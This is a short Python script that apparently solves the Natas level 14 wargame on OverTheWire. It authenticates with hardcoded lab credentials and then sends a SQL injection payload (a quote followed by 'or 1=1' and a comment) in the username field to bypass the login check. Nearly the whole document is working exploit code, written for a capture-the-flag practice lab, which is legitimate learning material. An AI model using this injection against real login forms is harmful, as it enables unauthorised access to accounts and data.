import requests

username = "natas14"
password = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"

url = "http://%s.natas.labs.overthewire.org" % username
s = requests.Session()
r = s.get(url, auth = (username,password))

payload = {
    "debug": 1,
    "username": '" or 1=1-- -',
    "password": ''
}

r = s.get(url, params=payload, auth=(username, password))
print(r.text)
